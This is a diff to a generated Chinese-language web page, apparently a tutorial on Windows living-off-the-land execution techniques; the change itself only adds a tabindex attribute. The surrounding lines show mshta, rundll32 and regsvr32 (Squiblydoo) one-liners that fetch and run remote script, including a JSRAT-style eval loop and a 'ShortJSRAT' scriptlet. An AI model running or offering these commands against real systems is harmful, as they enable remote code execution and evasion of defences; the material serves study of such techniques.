@@ -114,7 +114,7 @@
 <h2 id="0x08-mshta">0x08 mshta</h2>
 <p>mshta http://192.168.3.1/run.hta</p>
 <p>run.hta 内容如下：</p>
-<pre><code>&lt;HTML&gt; 
+<pre tabindex="0"><code>&lt;HTML&gt; 
 &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
 &lt;HEAD&gt; 
 &lt;script language=&quot;VBScript&quot;&gt;
@@ -130,12 +130,12 @@ demo
 &lt;/HEAD&gt; 
 &lt;/HTML&gt;
 </code></pre><h2 id="0x09-rundll32">0x09 rundll32</h2>
-<pre><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}%
+<pre tabindex="0"><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}%
 </code></pre><p>其实还是依赖于WScript.shell这个组件</p>
 <h2 id="0x10-regsvr32">0x10 regsvr32</h2>
 <p>regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll</p>
 <p>test.data内容：</p>
-<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+<pre tabindex="0"><code>&lt;?XML version=&quot;1.0&quot;?&gt;
 &lt;scriptlet&gt;
 &lt;registration
     progid=&quot;ShortJSRAT&quot;
